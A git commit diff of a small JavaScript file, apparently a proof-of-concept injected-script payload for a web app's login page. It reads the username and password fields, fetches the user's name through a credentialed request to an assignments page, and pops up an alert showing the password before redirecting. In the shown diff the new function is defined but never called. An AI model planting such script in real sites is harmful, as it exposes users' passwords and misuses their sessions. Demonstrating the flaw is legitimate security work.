7bc9cf1ab67a6122a9bd1b7001291cfa91de8a16
realmadsci <71108352+realmadsci@users.noreply.github.com>
2020-11-22 16:48:36 -0500

    Update megascary.js

--- megascary.js
+++ megascary.js
@@ -1,6 +1,20 @@
 var u = document.getElementsByName('UsernameOrEmailAddress')[0].value;
 var p = document.getElementsByName('Password')[0].value;
 
-alert(`Hello ${u},\nYour password is:\n${p}`);
+function sayhello() {
+  // Fetch the user's name by requesting the "My Assignments" page and parsing it:
+  var xhr = new XMLHttpRequest();
+  xhr.onload = function() {
+    fullname=this.responseXML.querySelector('.card').querySelector('.pull-left').innerText;;
+    // Post a creepy message:
+    alert(`Hello ${fullname},\nYour password is:\n${p}`);
 
-document.location.href = "/";
+    // Redirect on to the main page
+    document.location.href = "/";
+  }
+  xhr.open('GET', '/Assignments/MyAssignments');
+  xhr.responseType = "document";
+  xhr.withCredentials = true;
+  xhr.send();
+}
+
